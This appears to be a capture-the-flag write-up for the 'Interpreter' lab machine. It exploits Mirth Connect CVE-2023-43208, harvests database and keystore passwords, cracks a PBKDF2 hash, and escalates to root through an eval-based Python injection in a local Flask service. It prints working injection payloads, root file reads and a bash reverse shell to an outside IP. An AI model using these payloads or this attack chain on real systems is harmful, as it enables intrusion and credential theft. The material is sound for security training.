# Interpreter

**Target IP:** `10.129.6.65`
**Hostname:** `interpreter.htb`
**Platform:** `Linux`
**Difficulty:** `Medium`

---

## 1. Enumeration

### Port Scan

```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

So we have two websites (or http and https versions) and ssh.

### Web Reconnaissance

Visiting port 80 we see a website hosting NextGen Healthcare by Mirth Connect. There is some options to download a launcher and another to launch the launcher (perhaps?) On the right we see there is a login but this seemingly requires https.
![[Pasted image 20260224140526.png]]

Visiting the https site we can attempt to login.

Subdomain / vhost enumeration:

```bash
ffuf -c -u http://10.129.6.65 -H "Host: FUZZ.interpreter.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

They all return 200, so we need to filter by length instead:

```bash
ffuf -c -u http://10.129.6.65 -H "Host: FUZZ.interpreter.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fl 82
```
![[Pasted image 20260224101843.png]]

Nothing found.

Directory fuzzing:

```bash
feroxbuster -u http://interpreter.htb
```
![[Pasted image 20260224101959.png]]

This finds an endpoint `/webadmin` and `/installers` which may be interesting.

```bash
feroxbuster -u http://interpreter.htb
```
![[Pasted image 20260224102501.png]]

Here we find `/api` but nothing else.

### Additional Enumeration

Doing a quick google for Mirth Connect, it seems there has been several exploits in the past, with a notable one mentioned by NHS.
![[Pasted image 20260224102140.png]]

I download the file using:

```bash
wget https://s3.amazonaws.com/downloads.mirthcorp.com/connect-client-launcher/mirth-administrator-launcher-latest-unix.sh
```

This file is quite large and takes a little while.

We then run the file:

```bash
chmod +x mirth-administrator-launcher-latest-unix.sh
./mirth-administrator-launcher-latest-unix.sh
```

This gets an exec issue, as I'm using ARM. Because of this I can't verify the version, but I suspect it's exploitable to a CVE so I start trying some.

---

## 2. Initial Foothold — CVE-2023-43208 (Mirth Connect Unauthenticated RCE)

The Mirth Connect NextGen Healthcare instance was suspected to be vulnerable to a known unauthenticated RCE. The version can be determined by:

```bash
curl -k -H 'X-Requested-With: OpenAPI' https://interpreter.htb:443/api/server/version
```

This works and returns `4.4.0`.
![[Pasted image 20260224103838.png]]

This verifies the version is affected and that the following PoC is applicable:

**Reference / PoC:** https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT

### Exploitation

Getting the PoC to work involved playing around with the packages a bit as `pip install -r requirements` didn't work straight away.

I spin up a listener using penelope (https://github.com/brightio/penelope) and then fire off the PoC:

```bash
python3 CVE-2023-43208.py --url 'https://interpreter.htb:443/' --lhost 10.10.15.53 --lport 4444
```
![[Pasted image 20260224104422.png]]

And we get a shell, and penelope auto upgrades it.
![[Pasted image 20260224104448.png]]

We are running as user `mirth`. There is a user `sedric` in `/home` but we don't have permission to access it.
![[Pasted image 20260224104530.png]]

---

## 3. Credential Harvesting

In `/usr/local/mirthconnect/conf/mirth.properties` we find a database URL:

```
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
```
![[Pasted image 20260224104720.png]]

We find some keystore info (although this is doubtfully useful on its own):

```
keystore.path = ${dir.appdata}/keystore.jks
keystore.storepass = 5GbU5HGTOOgE
keystore.keypass = tAuJfQeXdnPw
keystore.type = JCEKS
```

### Discovered Credentials

We also find database credentials in the same file:

|Location|Type|Value|
|---|---|---|
|`/usr/local/mirthconnect/conf/mirth.properties`|Plaintext DB creds|`mirthdb` / `MirthPass123!`|
|`/usr/local/mirthconnect/conf/mirth.properties`|Keystore store/key passwords|`5GbU5HGTOOgE` / `tAuJfQeXdnPw`|

We can connect using these:

```bash
mysql -u mirthdb -p
```
![[Pasted image 20260224104946.png]]

We use `mc_bdd_prod`:

```mysql
USE mc_bdd_prod;
```

Tables that exist:

```mysql
SHOW TABLES;
```
![[Pasted image 20260224105058.png]]

`PERSON_PASSWORD` seems interesting. We find a password hash and a `PERSON_ID` (2); cross-referencing this with the `PERSON` table this seems to belong to `sedric`.
![[Pasted image 20260224105225.png]]

Password hash: `u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==`

This appears to be base64 encoded, and looking online it appears these passwords are encrypted with `keystore.jks`.

### Hash Analysis

`keystore.jks` is found in `/var/lib/mirthconnect/keystore.jks` (from `mirth.properties`). We can dump the key info using the storepass `5GbU5HGTOOgE`:

```bash
keytool -list -v -keystore keystore.jks
```
![[Pasted image 20260224105938.png]]

I pull the file locally and start to extract the key:

```bash
keytool -importkeystore \
  -srckeystore keystore.jks \
  -destkeystore keystore.p12 \
  -deststoretype PKCS12 \
  -srcalias mirthconnect
```

I enter `5GbU5HGTOOgE` for the first 3 prompts and then the keypass `tAuJfQeXdnPw` for the 4th.
![[Pasted image 20260224110432.png]]

Extract the private key (entering password `5GbU5HGTOOgE`):

```bash
openssl pkcs12 -in keystore.p12 -nocerts -nodes -out private.key
openssl pkcs12 -in keystore.p12 -nokeys -out cert.pem
```
![[Pasted image 20260224110545.png]]

Now we have a private key. At this point Claude hallucinates a decryption script, which doesn't work — a dead end.

To progress, I dig into the Mirth Connect source code to see how encryption/hashing is actually implemented. The development branch has relevant classes here: https://github.com/nextgenhealthcare/connect/tree/development/core-util/src/com/mirth/commons/encryption

The most relevant file: https://github.com/nextgenhealthcare/connect/blob/development/core-util/src/com/mirth/commons/encryption/Digester.java

This code uses a salt size of 8 bytes, 600,000 iterations, and PBKDF2WithHmacSHA256.
![[Pasted image 20260224114109.png]]

The operation starts here, where the digest is decoded from base64:
![[Pasted image 20260224114624.png]]

The salt is then extracted by taking the first 8 bytes of the decoded digest:
![[Pasted image 20260224114415.png]]

The remaining 32 bytes form the digest itself.
![[Pasted image 20260224115941.png]]

So we can format this into a hashcat-crackable string using mode 10900, with the format `sha256:600000:<salt_b64>:<digest_b64>`.

I create a short python script to output the hash format required:

```python
import base64
raw = base64.b64decode("u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==")
salt, digest = raw[:8], raw[8:]
print(f"sha256:600000:{base64.b64encode(salt).decode()}:{base64.b64encode(digest).decode()}")
```

This gives us:

```
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

### Cracking

```bash
hashcat -m 10900 -a 0 sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps= /usr/share/wordlists/rockyou.txt
```

And the password cracks eventually:
![[Pasted image 20260224131408.png]]

**Cracked credential:** `snowflake1`

---

## 4. User Shell

```bash
ssh sedric@interpreter.htb
```

We can SSH in now and grab the user flag:
![[Pasted image 20260224131514.png]]

---

## 5. Privilege Escalation — Flask SSTI via Local Notification Service

### Enumeration

The `sudo` command seems to be missing:
![[Pasted image 20260224131758.png]]

Let's run linpeas. It finds a few things, interestingly a service hosted at port `6661`. It also finds a shell script at `/usr/bin/gettext.sh`.

I want to view this service from my local machine so I put chisel on the box and run:

```bash
chisel server --socks5 --reverse -p 8081 -v
```

and on the box:

```bash
./chisel-QLWSqedA client 10.10.15.53:8081 R:9050:socks
```

This doesn't actually help, as I still can't curl the service or determine what's running.

### Reviewing the Vulnerable Component

I manually search running processes to match up the service, and find the following python file running as root:

```bash
ps -aux
```
![[Pasted image 20260224133844.png]]

Viewing this, it appears to be a Flask application running on port `54321`:

```python
#!/usr/bin/env python3
"""
Notification server for added patients.
This server listens for XML messages containing patient information and writes formatted notifications to files in /var/secure-health/patients/.
It is designed to be run locally and only accepts requests with preformated data from MirthConnect running on the same machine.
It takes data interpreted from HL7 to XML by MirthConnect and formats it using a safe templating function.
"""
from flask import Flask, request, abort
import re
import uuid
from datetime import datetime
import xml.etree.ElementTree as ET, os

app = Flask(__name__)
USER_DIR = "/var/secure-health/patients/"; os.makedirs(USER_DIR, exist_ok=True)

def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # DOB format is DD/MM/YYYY
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
    except:
        return "[INVALID_DOB]"
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"

@app.route("/addPatient", methods=["POST"])
def receive():
    if request.remote_addr != "127.0.0.1":
        abort(403)
    try:
        xml_text = request.data.decode()
        xml_root = ET.fromstring(xml_text)
    except ET.ParseError:
        return "XML ERROR\n", 400
    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
    if patient is None:
        return "No <patient> tag found\n", 400
    id = uuid.uuid4().hex
    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
    notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
    path = os.path.join(USER_DIR,f"{id}.txt")
    with open(path,"w") as f:
        f.write(notification+"\n")
    return notification

if __name__=="__main__":
    app.run("127.0.0.1",54321, threaded=True)
```

When I attempt to curl this service from my machine it doesn't work:
![[Pasted image 20260224134117.png]]

Digging into the code, this check is what blocks it:

```python
if request.remote_addr != "127.0.0.1":
        abort(403)
```

As this is a Flask app running as root, I'm straight away thinking about SSTI.

### Vulnerability Analysis

The root cause is that user-controlled `firstname`, `lastname`, `sender_app`, `timestamp`, `birth_date`, and `gender` fields are interpolated directly into a Python f-string template, which is then passed to `eval()`. The regex filter only restricts the *character set* allowed (alphanumerics, `._'"(){}=+/`), not the *structure* of the input — so a field can smuggle in arbitrary Python expressions (e.g. `{__import__("os")...}`) as long as it only uses permitted characters. Notably, spaces are not in the allowed character set, which constrains payloads somewhat but does not prevent exploitation.

### How the Exploit Works

We don't have curl on the box, so I grab a prebuilt static binary and put it on the box so we can make requests to the locally-bound service.

A valid baseline request looks like this:

```bash
./curl -s -X POST http://127.0.0.1:54321/addPatient -H "Content-Type: application/xml" -d '<?xml version="1.0"?><patient><firstname>John</firstname><lastname>Doe</lastname><sender_app>MirthConnect</sender_app><timestamp>120000</timestamp><birth_date>01/01/1990</birth_date><gender>M</gender></patient>'
```
![[Pasted image 20260224135559.png]]

Due to the regex there are certain characters we aren't allowed, such as `:`.

Testing basic SSTI by injecting into `firstname`:

```bash
./curl -s -X POST http://127.0.0.1:54321/addPatient -H "Content-Type: application/xml" -d '<?xml version="1.0"?><patient><firstname>{__import__("os").popen("id").read()}</firstname><lastname>Doe</lastname><sender_app>MirthConnect</sender_app><timestamp>120000</timestamp><birth_date>01/01/1990</birth_date><gender>M</gender></patient>'
```
![[Pasted image 20260224135643.png]]

This executes because the name is injected directly into the f-string and then `eval`'d:

```python
template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
```

Part of the challenge is that the regex bans spaces. This same technique can read arbitrary files as root, for example:

```bash
./curl -s -X POST http://127.0.0.1:54321/addPatient -H "Content-Type: application/xml" -d '<?xml version="1.0"?><patient><firstname>{open("/root/root.txt").read()}</firstname><lastname>Doe</lastname><sender_app>MirthConnect</sender_app><timestamp>120000</timestamp><birth_date>01/01/1990</birth_date><gender>M</gender></patient>'
```
![[Pasted image 20260224140346.png]]

### Building the Final Exploit

To get a full shell (rather than just command output), since we already have write access to the box as `sedric`, we can write a malicious bash script to disk and execute that instead of trying to build a one-liner around the space/character restrictions.

In `/tmp/exploit.sh`:

```bash
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.10.15.53/4444 0>&1
```

And to execute it via the SSTI:

```bash
./curl -s -X POST http://127.0.0.1:54321/addPatient -H "Content-Type: application/xml" -d '<?xml version="1.0"?><patient><firstname>{__import__("os").popen("/tmp/exploit.sh").read()}</firstname><lastname>Doe</lastname><sender_app>MirthConnect</sender_app><timestamp>120000</timestamp><birth_date>01/01/1990</birth_date><gender>M</gender></patient>'
```

### Testing

On the listener, we get a shell as root:
![[Pasted image 20260224141940.png]]

**Note on an alternative path:** upon reflection, it is technically possible to achieve root before obtaining the user credential, since the low-privileged `mirth` foothold already has write access needed to stage the payload script and make the local curl request. The exact XML template expected by the service can be recovered from the database rather than reverse-engineering it, avoiding the need to crack the user hash at all:

```mysql
SELECT * FROM CHANNEL;
```
![[Pasted image 20260224143303.png]]

These decode as:

```
MSH|^~\\&|WEBAPP|INTERPRETER|MIRTH|INTERPRETER|TIMESTAMP||ADT^A01||P|2.5
PID|1||PATIENTID^^^INTERPRETER||LASTNAME^FIRSTNAME||DATEOFBIRTH|GENDER
```

and:

```xml
<patient>
  <timestamp></timestamp>
  <sender_app></sender_app>
  <id></id>
  <firstname></firstname>
  <lastname></lastname>
  <birth_date></birth_date>
  <gender></gender>
</patient>
```

respectively. With this info, the same attack could be performed without cracking the user hash at all.

---

## Summary

| Step                 | Technique                            |
| -------------------- | ------------------------------------ |
| Initial access       | CVE-2023-43208 — Mirth Connect unauthenticated RCE |
| Credential access    | DB creds from `mirth.properties` → cracked `PERSON_PASSWORD` hash via reverse-engineered PBKDF2WithHmacSHA256 scheme (hashcat mode 10900) |
| User shell           | SSH as `sedric` using cracked password `snowflake1` |
| Privilege escalation | Python f-string SSTI in root-owned local Flask notification service (port 54321), reachable via loopback restriction bypass |